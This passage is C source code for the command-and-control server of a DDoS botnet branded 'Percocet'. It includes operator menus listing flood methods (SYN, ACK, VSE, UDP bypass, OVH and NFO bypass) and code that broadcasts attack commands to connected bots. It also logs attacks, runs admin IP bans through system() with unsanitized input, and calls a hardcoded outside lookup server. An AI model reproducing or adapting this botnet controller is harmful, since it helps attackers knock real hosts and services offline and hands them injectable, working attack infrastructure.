			sprintf(botnet, "\e[38;5;201m.BYPASS \x1b[38;5;202mTakes You To The Bypass Methods\r\n");
			if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
						
        sprintf(input, "\x1b[38;5\x1b[38;5;202m|\e[0m\e[38;5;201mPercocet\e[0m\x1b[38;5;202m|\x1b[38;5;202m~\e[0m\x1b[38;5;201m# \e[96m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
	    }		
		if(strstr(buf, "Attk") || strstr(buf, "attk") || strstr(buf, "ATTK")) { 		  
            sprintf(botnet, "        \e[38;5;202m╔═════════════════════════════╗\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);					
			sprintf(botnet, "        \e[38;5;202m║ \e[38;5;201mTCP IP PORT TIME [TCP]      \e[38;5;202m║\r\n"); 
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);			
			sprintf(botnet, "        \e[38;5;202m║ \e[38;5;201mACK IP PORT TIME [TCP-ACK]  \e[38;5;202m║ \r\n");                                                                                                        
			if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, "        \e[38;5;202m║ \e[38;5;201mVSE IP PORT TIME [GAME]     \e[38;5;202m║\r\n");                                                                                                 
			if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, "        \e[38;5;202m║ \e[38;5;201mSYN IP PORT TIME [REDSYN]   \e[38;5;202m║\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, "        \e[38;5;202m║ \e[38;5;201mSTD IP PORT TIME [STDXEX]   \e[38;5;202m║    \r\n"); 
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, "        \e[38;5;202m║ \e[38;5;201mUDPBYPASS IP PORT TIME 65500\e[38;5;202m║ \r\n"); 			
			if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, "        \e[38;5;202m╚═════════════════════════════╝\r\n");
			if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
						
        sprintf(input, "\x1b[38;5\x1b[38;5;202m|\e[0m\e[38;5;201mPercocet\e[0m\x1b[38;5;202m|\x1b[38;5;202m~\e[0m\x1b[38;5;201m# \e[96m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
	    }
		if(strstr(buf, ".bypasscacsas") || strstr(buf, ".Bypasscascascs") || strstr(buf, ".BYPAscascaSS")) { 		  
            sprintf(botnet, "        \x1b[38;5;202m╔═══════════════════════════════════╗\r\n");	
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);			
			sprintf(botnet, "        \x1b[38;5;202m║ NFOHEX [\x1b[38;5;201mIP\x1b[38;5;202m] [\x1b[38;5;201mPORT\x1b[38;5;202m] [\x1b[38;5;201mTIME\x1b[38;5;202m]         ║\r\n"); 
			if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);   
			sprintf(botnet, "        \x1b[38;5;202m║ OVHHEX [\x1b[38;5;201mIP\x1b[38;5;202m] [\x1b[38;5;201mPORT\x1b[38;5;202m] [\x1b[38;5;201mTIME\x1b[38;5;202m]         ║\r\n");	
			if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, "        \x1b[38;5;202m║ UDPBYPASS [\x1b[38;5;201mIP\x1b[38;5;202m] [\x1b[38;5;201mPORT\x1b[38;5;202m] [\x1b[38;5;201mTIME\x1b[38;5;202m] [\x1b[38;5;201mPS\x1b[38;5;202m] ║\r\n");	
			if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, "        \x1b[38;5;202m╚═══════════════════════════════════╝\r\n");
			if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			
        sprintf(input, "\x1b[38;5\x1b[38;5;202m|\e[0m\e[38;5;201mPercocet\e[0m\x1b[38;5;202m|\x1b[38;5;202m~\e[0m\x1b[38;5;201m# \e[96m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
	    }		
		if(strstr(buf, "ADMIN") || strstr(buf, "admin") || strstr(buf, "Admin")) {
			if(managements[datafd].adminstatus == 1){       
				sprintf(botnet,  "\x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\e[38;5;201mbip  \x1b[38;5;202mBans A Ip Address From The C2  \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\e[38;5;201munbanip \x1b[38;5;202mUnbans A Ip Address From The C2   \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\e[38;5;201monline \x1b[38;5;202mShows All Usernames & Ips\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			            
	    sprintf(input, "\x1b[38;5\x1b[38;5;202m|\e[0m\e[38;5;201mPercocet\e[0m\x1b[38;5;202m|\x1b[38;5;202m~\e[0m\x1b[38;5;201m# \e[96m ", accounts[find_line].username);		
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
	   }
        else
       {
                printf("\x1b[38;5;202m%s\e[38;5;201m Has Attempted To Use An Admin Command With A Regular Account\x1b[0m\r\n", accounts[find_line].username); 		   
                sprintf(botnet, "\x1b[1;31mAdmins Only!\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
        }
		if(strstr(buf, ".TOOnjcncLSksadjaskc") || strstr(buf, ".xcadvcjadkotools") || strstr(buf, ".Tcvjisvdsjivdjaivioadsools")) {
			sprintf(botnet,  "\e[38;5;201m.IPLOOKUP \x1b[38;5;202m[\e[38;5;201mHOST\x1b[38;5;202m]\x1b[0m\r\n");
		    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet,  "\e[38;5;201m.RESOLVER \x1b[38;5;202m[\e[38;5;201mHOST\x1b[38;5;202m]\x1b[0m\r\n");
		    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
         sprintf(input, "\x1b[38;5\x1b[38;5;202m|\e[0m\e[38;5;201mPercocet\e[0m\x1b[38;5;202m|\x1b[38;5;202m~\e[0m\x1b[38;5;201m# \e[96m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
	   }
    if(strstr(buf, "CLEAR") || strstr(buf, "clear") || strstr(buf, "Clear") || strstr(buf, "cls") || strstr(buf, "CLS") || strstr(buf, "Cls")) {
				if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
                	if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
	                if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
	                if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
	                if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
	                if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
	                if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
	                if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
	                if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
	                if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
        sprintf(input, "\x1b[38;5\x1b[38;5;202m|\e[0m\e[38;5;201mPercocet\e[0m\x1b[38;5;202m|\x1b[38;5;202m~\e[0m\x1b[38;5;201m# \e[96m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
			}	
		 if(strstr(buf, "BIP") || strstr(buf, "bip") || strstr(buf, "Bip")) {	
        if(managements[datafd].adminstatus == 1){
        char bannie111[40];
        char commandban[80];
        char commandban1[80];

        if(send(datafd, "\x1b[1;36mIp\x1b[1;31m:\x1b[1;36m ", strlen("\x1b[1;36mIp\x1b[1;31:\x1b[1;36m "), MSG_NOSIGNAL) == -1) goto end;
        memset(bannie111, 0, sizeof(bannie111));
        read(datafd, bannie111, sizeof(bannie111));
        trim(bannie111);
                
        char banmsg[80];

        sprintf(commandban, "iptables -A INPUT -s %s -j DROP", bannie111);
        sprintf(commandban1, "iptables -A OUTPUT -s %s -j DROP", bannie111);

        system(commandban);
        system(commandban1);
        LogFile2 = fopen("/root/Logs/ip.ban.unban.log", "a");
        fprintf(LogFile2, "[banned] |ip:%s|\n", bannie111);
        fclose(LogFile2);

        printf("\x1b[38;5;202m%s \e[38;5;201mHas Been Ip Banned From The C2 By \x1b[38;5;202m%s\r\n", bannie111, accounts[find_line].username);
		sprintf(banmsg, "\x1b[1;33mIp\e[38;5;201m: \x1b[1;33m%s \e[38;5;201mHas Benn Banned\r\n", bannie111);
        if(send(datafd, banmsg,  strlen(banmsg),    MSG_NOSIGNAL) == -1) goto end; 

        sprintf(input, "\x1b[38;5\x1b[38;5;202m|\e[0m\e[38;5;201mPercocet\e[0m\x1b[38;5;202m|\x1b[38;5;202m~\e[0m\x1b[38;5;201m# \e[96m ", accounts[find_line].username);
        if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
    }
    else
		printf("\x1b[38;5;202m%s\e[38;5;201m Has Attempted To Use An Admin Command With A Regular Account\x1b[0m\r\n", accounts[find_line].username);
        sprintf(botnet, "\x1b[1;31mAdmins Only!\x1b[0m\r\n");
		if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
}
else if(strstr(buf, "online") || strstr(buf, "ONLINE")){
            int kkkkkk;
            for(kkkkkk = 0; kkkkkk < MAXFDS; kkkkkk++)
            {
                if(!managements[kkkkkk].connected) continue;
                if(managements[datafd].adminstatus == 1){
                    sprintf(botnet, "\e[38;5;201mUsername:\x1b[38;5;202m %s \e[38;5;201m| \x1b[38;5;202m%s\x1b[0m\r\n", managements[kkkkkk].nickname, managements[kkkkkk].ip);
                } else {
					printf("\x1b[38;5;202m%s\e[38;5;201m Has Attempted To Use An Admin Command With A Regular Account\x1b[0m\r\n", accounts[find_line].username);
                    sprintf(botnet, "\x1b[1;31mAdmins Only!\r\n");
                }
                if(send(datafd, botnet, strlen(botnet), 0) == -1) return;
            }
        }
if(strstr(buf, "UNBANIP") || strstr(buf, "Unbanip") || strstr(buf, "unbanip")) {
    if(managements[datafd].adminstatus == 1){
        char bannie1 [800];
        char commandunban[80];
        char commandunban1[80];

        if(send(datafd, "\x1b[1;36mIp\x1b[1;31m: \x1b[\x1b[1;36mm", strlen("\x1b[\x1b[1;36mIp\x1b[1;31m: \x1b[1;36m"), MSG_NOSIGNAL) == -1) goto end;
        memset(bannie1, 0, sizeof(bannie1));
        read(datafd, bannie1, sizeof(bannie1));
        trim(bannie1);

        char unbanmsg[80];

        sprintf(commandunban, "iptables -D INPUT -s %s -j DROP", bannie1);
        sprintf(commandunban1, "iptables -D OUTPUT -s %s -j DROP", bannie1);

        system(commandunban);
        system(commandunban1);
        LogFile2 = fopen("/root/Logs/ip.ban.unban.log", "a");

        fprintf(LogFile2, "[unbanned] |ip:%s|\n", bannie1);
        fclose(LogFile2);

        sprintf(unbanmsg, "\x1b[1;33mIp\e[38;5;201m:\x1b[1;33m %s \e[38;5;201mHas Been Unbanned\r\n", bannie1);

        if(send(datafd, unbanmsg,  strlen(unbanmsg),    MSG_NOSIGNAL) == -1) goto end;  

        printf("\x1b[38;5;202m%s \e[38;5;201mHas Been Ip Unbanned From The C2 By \x1b[38;5;202m%s\r\n", bannie1, accounts[find_line].username);
		sprintf(input, "\x1b[38;5\x1b[38;5;202m|\e[0m\e[38;5;201mPercocet\e[0m\x1b[38;5;202m|\x1b[38;5;202m~\e[0m\x1b[38;5;201m# \e[96m ", accounts[find_line].username);
        if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
    }
    else
		printf("\x1b[38;5;202m%s\e[38;5;201m Has Attempted To Use An Admin Command With A Regular Account\x1b[0m\r\n", accounts[find_line].username);
        sprintf(botnet, "\x1b[1;31mAdmins Only!\r\n");
		if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
}
       if(strstr(buf, ".rsafasesolve") || strstr(buf, ".RESsafsaOLVE")){
            char *ip[100];
            char *token = strtok(buf, " ");
            char *url = token+sizeof(token);
            trim(url);
            resolvehttp(url, ip);
            printf("[Resolver] %s -> %s\n", url, ip);
            sprintf(botnet, "\e[38;5;201m[\x1b[1;33mResolver\e[38;5;201m] \x1b[1;33m%s\e[38;5;201m-> \x1b[1;33m%s\r\n", url, ip);
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
			        else if(strstr(buf, ".isdasplookup") || strstr(buf, ".IPasfafLOOKUP"))
        {
            char myhost[20];
            char ki11[1024];
            snprintf(ki11, sizeof(ki11), "%s", buf);
            trim(ki11);
            char *token = strtok(ki11, " ");
            snprintf(myhost, sizeof(myhost), "%s", token+strlen(token)+1);
            if(atoi(myhost) >= 8)
            {
                int ret;
                int IPLSock = -1;
                char iplbuffer[1024];
                int conn_port = 80;
                char iplheaders[1024];
                struct timeval timeout;
                struct sockaddr_in sock;
                char *iplookup_host = "194.32.78.192"; // Change to Server IP
                timeout.tv_sec = 4; // 4 second timeout
                timeout.tv_usec = 0;
                IPLSock = socket(AF_INET, SOCK_STREAM, 0);
                sock.sin_family = AF_INET;
                sock.sin_port = htons(conn_port);
                sock.sin_addr.s_addr = inet_addr(iplookup_host);
                if(connect(IPLSock, (struct sockaddr *)&sock, sizeof(sock)) == -1)
                {
                    //printf("[\x1b[31m-\x1b[31m] Failed to connect to iplookup host server...\n");
                    sprintf(botnet, "\e[38;5;201m[\x1b[1;33mIPLookup\e[38;5;201m] Failed to connect to iplookup server...\x1b[31;1m\r\n", myhost);
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                else
                {
                    //printf("[\x1b[32m+\x1b[31m] Connected to iplookup server :)\n");
                    snprintf(iplheaders, sizeof(iplheaders), "GET /iplookup.php?host=%s HTTP/1.1\r\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding:gzip, deflate, sdch\r\nAccept-Language:en-US,en;q=0.8\r\nCache-Control:max-age=0\r\nConnection:keep-alive\r\nHost:%s\r\nUpgrade-Insecure-Requests:1\r\nUser-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/531m.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/531m.36\r\n\r\n", myhost, iplookup_host);
                    if(send(IPLSock, iplheaders, strlen(iplheaders), 0))
                    {
                        //printf("[\x1b[32m+\x1b[31m] Sent request headers to iplookup api!\n");
                        sprintf(botnet, "\e[38;5;201m[\x1b[1;33mPercocet\x1b[1;36m] \e[38;5;201mIp -> \x1b[1;33m%s \e[38;5;201mIs Being Resolved\x1b[1;33m...\r\n", myhost);
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        char ch;
                        int retrv = 0;
                        uint32_t header_parser = 0;
                        while (header_parser != 0x0D0A0D0A)
                        {
                            if ((retrv = read(IPLSock, &ch, 1)) != 1)
                                break;
                
                            header_parser = (header_parser << 8) | ch;
                        }
                        memset(iplbuffer, 0, sizeof(iplbuffer));
                        while(ret = read(IPLSock, iplbuffer, 1024))
                        {
                            iplbuffer[ret] = '\0';
                            /*if(strlen(iplbuffer) > 1)
                                printf("\x1b[36m%s\x1b[31m\n", buffer);*/
                        }
                        //printf("%s\n", iplbuffer);
                        if(strstr(iplbuffer, "<title>404"))
                        {
                            char iplookup_host_token[20];
                            sprintf(iplookup_host_token, "%s", iplookup_host);
                            int ip_prefix = atoi(strtok(iplookup_host_token, "."));
                            sprintf(botnet, "\x1b[31m[IPLookup] Failed, API can't be located on server %d.*.*.*:80\x1b[0m\r\n", ip_prefix);
                            memset(iplookup_host_token, 0, sizeof(iplookup_host_token));
                        }
                        else if(strstr(iplbuffer, "nicknameers"))
                            sprintf(botnet, "\x1b[31m[IPLookup] Failed, Hosting server needs to have php installed for api to work...\x1b[0m\r\n");
                        else sprintf(botnet, "\e[38;5;201m[+]--- \x1b[1;33mResults\e[38;5;201m ---[+]\r\n\%s\x1b[31m\r\n", iplbuffer);
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                    else
                    {
                        //printf("[\x1b[31m-\x1b[31m] Failed to send request headers...\n");
                        sprintf(botnet, "\x1b[31m[IPLookup] Failed to send request headers...\r\n");
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                }
                close(IPLSock);
            }
        }

        trim(buf);
        sprintf(input, "\x1b[38;5\x1b[38;5;202m|\e[0m\e[38;5;201mPercocet\e[0m\x1b[38;5;202m|\x1b[38;5;202m~\e[0m\x1b[38;5;201m# \e[96m ", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
            if(strlen(buf) == 0) continue;
//           This makes the c2 only send floods to the socket 
			if(strstr(buf,"TCP")  || strstr(buf,"SYN") || strstr(buf,"ACK") || strstr(buf,"UDPBYPASS") || strstr(buf,"VSE") || strstr(buf,"XMS") || strstr(buf,"STD") || strstr(buf,"OVHHEX") || strstr(buf,"NFOHEX"))
			{           		 
            char attacklog[1024];
		    printf("%s Has Sent Succesfully Sent A Flood | %s\n",accounts[find_line].username, buf);
		    // Prints attacks to the sockets and Logs it
			sprintf(attacklog, "echo 'User: %s | Status: %s | Ip: %s | Attack:%s' >> /root/Logs/AttackLogs.log", accounts[find_line].username, accounts[find_line].type, management_ip, buf);
            system(attacklog);
			char addtrigger[5000];
            sprintf(addtrigger, ". %s", buf);
            broadcast(addtrigger, datafd, accounts[find_line].username);
			}
            memset(buf, 0, 2048);
        }
        char userleft[1024];
		end:
		managements[datafd].connected = 0;
		close(datafd);
		OperatorsConnected--;
		if(managements[datafd].adminstatus == 1){
		printf("\x1b[1;33mUser\x1b[38;5;202m:\x1b[1;97m %s \x1b[38;5;202m|\x1b[1;33m Status\x1b[38;5;202m:\x1b[1;97m %s \x1b[38;5;202m|\x1b[1;33m Disconnected\x1b[1;97m From C2\n\r",accounts[find_line].username, accounts[find_line].type);
		sprintf(userleft, "echo 'User: %s | Status: %s | Has Logged Out' >> /root/Logs/C2Logouts.log", accounts[find_line].username, accounts[find_line].type);
        system(userleft);
		} else {
		printf("\x1b[1;33mUser\x1b[38;5;202m:\x1b[1;97m %s \x1b[38;5;202m|\x1b[1;33m Status\x1b[38;5;202m:\x1b[1;97m %s \x1b[38;5;202m|\x1b[1;33m Ip\x1b[38;5;202m:\x1b[1;97m %s \x1b[38;5;202m|\x1b[1;33m Disconnected\x1b[1;97m From C2\n\r", accounts[find_line].username, accounts[find_line].type, management_ip);
        sprintf(userleft, "echo 'User: %s | Status: %s | Ip: %s | Has Logged Out' >> /root/Logs/C2Logouts.log", accounts[find_line].username, accounts[find_line].type, management_ip);
        system(userleft);		
		}
}
/*STARCODE*/
void *BotListener(int port){
    int sockfd, newsockfd, gay=1;
    struct epoll_event event;
    socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
	if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &gay, sizeof(int)) < 0) // HUNNNNNNN YEA
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(cli_addr);
    while (1){
        newsockfd = accept(sockfd, (struct sockaddr *)&cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        
        struct telnetListenerArgs args;
        args.sock = newsockfd;
        args.ip = ((struct sockaddr_in *)&cli_addr)->sin_addr.s_addr;

        pthread_t thread;
        pthread_create(&thread, NULL, &BotWorker, (void *)&args);
    }   
}
int main (int argc, char *argv[], void *sock) {
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }

		port = atoi(argv[3]);
		
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
		fprintf (stderr, "    \x1b[1;33mPercocet Screened \e[38;5;201m|\x1b[1;33m With Threads:\x1b[0;38;5;026m%s \e[38;5;201m|\x1b[1;33m Bot Port:\x1b[0;38;5;026m%s \e[38;5;201m|\x1b[1;33m C2 Port:\x1b[0;38;5;026m%s\r\n", argv[2], argv[1], argv[3]);
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "ZERO");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}
